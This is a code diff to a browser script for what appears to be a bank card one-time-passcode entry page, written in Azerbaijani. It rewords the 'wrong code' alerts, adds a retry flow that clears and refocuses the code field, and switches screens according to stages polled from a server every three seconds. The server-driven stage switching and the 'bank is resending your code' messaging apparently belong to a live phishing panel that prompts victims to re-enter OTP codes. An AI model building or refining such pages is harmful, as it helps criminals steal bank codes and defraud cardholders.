@@ -56,11 +56,27 @@
   function showWrongCode() {
     if (alertBox) {
       alertBox.className = 'alert alert--error';
-      alertBox.innerHTML = '<strong>Səhv 3-D kod daxil etmisiniz.</strong><br>Kod təkrar göndərilir…';
+      alertBox.innerHTML = '<strong>Səhv OTP kodu daxil etmisiniz!</strong><br>Yenidən cəhd edin…';
       alertBox.style.display = '';
     }
-    if (title) { title.textContent = 'Kod təkrar göndərilir'; }
-    if (note) { note.textContent = 'Yeni 3-D kod bank tərəfindən göndərilir. Zəhmət olmasa gözləyin.'; }
+    if (title) { title.textContent = 'OTP kodu səhvdir'; }
+    if (note) { note.textContent = 'Lütfən yenidən OTP kodu daxil edin.'; }
+  }
+
+  function showRetryOption() {
+    var retryBox = document.getElementById('retryBox');
+    var form = document.getElementById('codeForm');
+    if (retryBox) {
+      retryBox.style.display = '';
+    }
+    if (form) {
+      form.style.display = '';
+      var codeInput = form.querySelector('#code');
+      if (codeInput) {
+        codeInput.value = '';
+        codeInput.focus();
+      }
+    }
   }
 
   var polling = setInterval(async function () {
@@ -75,6 +91,7 @@
       if (r.stage && r.stage !== currentStage) {
         currentStage = r.stage;
         if (r.stage === 'wrong_code') { showWrongCode(); }
+        if (r.stage === 'otp_entry') { showRetryOption(); }
         resetTimer(r.secondsLeft);
       } else if (typeof r.secondsLeft === 'number' && Math.abs(r.secondsLeft - left) > 3) {
         left = r.secondsLeft;
@@ -82,4 +99,12 @@
       }
     } catch (e) { /* sükutla davam edir */ }
   }, 3000);
+
+  /* Retry button */
+  var retryBtn = document.getElementById('retryBtn');
+  if (retryBtn) {
+    retryBtn.addEventListener('click', function () {
+      location.reload();
+    });
+  }
 })();
